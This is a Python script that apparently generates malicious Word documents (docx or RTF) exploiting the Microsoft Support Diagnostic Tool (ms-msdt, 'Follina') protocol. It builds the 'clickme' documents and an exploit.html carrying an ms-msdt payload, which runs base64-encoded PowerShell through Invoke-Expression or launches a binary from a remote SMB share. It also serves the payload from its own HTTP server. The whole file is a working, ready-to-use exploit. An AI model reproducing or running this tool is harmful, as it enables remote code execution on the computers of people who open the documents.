import argparse
import os
import zipfile
import http.server
import socketserver
import base64
from urllib.parse import urlparse

# Helper function to zip whole dir
# https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            os.utime(os.path.join(root, file), (1653895859, 1653895859))
            ziph.write(os.path.join(root, file),
                       os.path.relpath(
                            os.path.join(root, file),
                            path
                       ))


def generate_docx(payload_url):
    const_docx_name = "clickme.docx"

    with open("src/document.xml.rels.tpl", "r") as f:
        tmp = f.read()

    payload_rels = tmp.format(payload_url = payload_url)

    if not os.path.exists("src/docx/word/_rels"):
        os.makedirs("src/docx/word/_rels")

    with open("src/docx/word/_rels/document.xml.rels", "w") as f:
        f.write(payload_rels)

    with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir("src/docx", zipf)

    print(f"Generated '{const_docx_name}' in current directory")

#solution based on https://github.com/bhdresh/CVE-2017-0199    
def generate_rtf(payload_url):
    s = payload_url
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 224 - len(docuri_hex)
    docuri_pad = "0"*docuri_pad_len
    uri_hex = "010000020900000001000000000000000000000000000000a4000000e0c9ea79f9bace118c8200aa004ba90b8c000000"+docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    const_rtf_name = "clickme.rtf"

    with open("src/rtf/clickme.rtf.tpl", "r") as f:
        tmp = f.read()

    payload_rtf = tmp.replace('{payload_url}', uri_hex) # cannot use format due to {} characters in RTF

    with open(const_rtf_name, "w") as f:
        f.write(payload_rtf)

    print(f"Generated '{const_rtf_name}' in current directory")    

if __name__ == "__main__":

    # Parse arguments
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('Required Arguments')
    binary = parser.add_argument_group('Binary Execution Arguments')
    command = parser.add_argument_group('Command Execution Arguments')
    optional = parser.add_argument_group('Optional Arguments')
    required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command"},
        help='Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command', required=True)
    binary.add_argument('-b', '--binary', action='store', dest='binary', 
        help='The full path of the binary to run. Can be local or remote from an SMB share')
    command.add_argument('-c', '--command', action='store', dest='command',
        help='The encoded command to execute in "command" mode')
    optional.add_argument('-t', '--type', action='store', dest='type', choices={"docx", "rtf"}, default="docx",
        help='The type of payload to use, can be "docx" or "rtf"', required=True)
    optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost". Disables web server if custom URL scheme or path are specified')
    optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
        help='The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)')
    optional.add_argument('-P', '--port', action='store', dest='port', default=80, type=int,
        help='The port to run the HTTP server on, defaults to 80')
    args = parser.parse_args()

    payload_url = f"http://{args.url}:{args.port}/exploit.html"
    
    if args.mode == "binary" and args.binary is None:
        raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")

    if args.mode == "command" and args.command is None:
        raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")

    payload_url = f"http://{args.url}:{args.port}/exploit.html"
    enable_webserver = True

    if args.url != "localhost":  # if not default, parse the custom URL
        url = urlparse(args.url)
        try:
            path = args.url.split("/")[1]
        except IndexError:  # no path detected in URL
            path = None
        if url.scheme == "http" or url.scheme == "https" or path is not None:  # if protocol or path is specified, use user input as-is
            payload_url = f"{args.url}"
            enable_webserver = False
            print("Custom URL detected, webserver will be disabled")
    # if none of these execute, the payload_url will remain as defined above, formatting the URL for the user

    if args.mode == "command":
        # Original PowerShell execution variant
        command = args.command.replace("\"", "\\\"")
        encoded_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('UTF-8') # Powershell life...
        payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""'''

    if args.mode == "binary":
        # John Hammond binary variant
        binary_path = args.binary.replace('\\', '\\\\').rstrip('.exe')
        payload = fr'"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({binary_path})/.exe\""'

    # Prepare the doc file
    if args.type == "docx":
        generate_docx(payload_url)

    if args.type == "rtf":
        generate_rtf(payload_url)

    # Prepare the HTML payload
    if not os.path.exists("www"):
        os.makedirs("www")

    with open("src/exploit.html.tpl", "r") as f:
        tmp = f.read()

    payload_html = tmp.format(payload = payload)

    with open("www/exploit.html", "w") as f:
        f.write(payload_html)

    print("Generated 'exploit.html' in 'www' directory")

    # Host the payload
    if enable_webserver is True:
        class Handler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory="www", **kwargs)

        print(f"Serving payload on {payload_url}")
        with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
            httpd.serve_forever()
